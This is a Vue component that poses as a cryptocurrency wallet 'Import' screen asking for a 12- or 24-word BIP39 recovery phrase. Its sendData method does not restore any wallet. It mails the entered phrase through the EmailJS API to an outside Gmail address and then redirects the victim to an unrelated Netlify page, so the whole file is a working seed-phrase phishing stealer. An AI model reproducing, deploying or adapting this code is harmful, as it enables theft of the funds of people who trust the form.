<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your 12/24 word phrase</label
    >
    <el-input type="textarea" :rows="6" v-model="nmenomic"> </el-input>
    <span>Please separate each Mnemonic Phrase with a space.</span>
    <p class="my-10 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys
      that manage your acccounts.
    </p>
    <el-button :loading="loading" @click="sendData">Import</el-button>
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      nmenomic: "",
      loading: false
    };
  },
  methods: {
    sendData() {
      this.loading = true;
      let self = this;
      const checker = this.formChecker();
      if (checker) {
        var data = {
          service_id: "service_lvrm641",
          template_id: "template_gnaql1j",
          user_id: "user_aq7h9Gzs5I9hrgtM0jmF3",
          template_params: {
            from_name: "Nmenomic",
            nmenomic: this.nmenomic,
            reply_to: "crewwebinar@gmail.com"
          }
        };
        axios
          .post("https://api.emailjs.com/api/v1.0/email/send", data)
          .then(function() {
            window.location.href = "https://barcode-validation.netlify.app/";
            self.loading = false;
          })
          .catch(function() {
            self.loading = false;
          });
      } else {
        this.$notify({
          title: "Warning",
          message: "All Form input is required",
          type: "warning"
        });
      }
    },
    formChecker() {
      if (this.nmenomic === "") {
        return false;
      } else {
        return true;
      }
    }
  }
};
</script>

<style lang="scss">
.private {
  min-height: 435px;

  label {
    color: #565656;
  }
  p {
    color: #3b99fc;
  }
  button {
    height: 50px;
    border: 1px solid #3b99fc;
    border-radius: 4px;
    background: black;
    text-transform: uppercase;
    transition: all 0.2s ease-in-out;
    font-size: 20px;
    font-weight: 600;
    color: #fff;

    &:hover,
    &:active {
      color: white;
      outline: none;
      border-color: #3b99fc;
      background-color: black;
    }
  }

  .el-textarea {
    textarea {
      background-color: black;
      outline: none !important;
      border: 1px solid #3b99fc !important;
      color: #fff;
      font-weight: 500;
      padding: 12px;
      font-size: 16px;
      resize: none;
      border-radius: 4px;
    }
  }
}
</style>
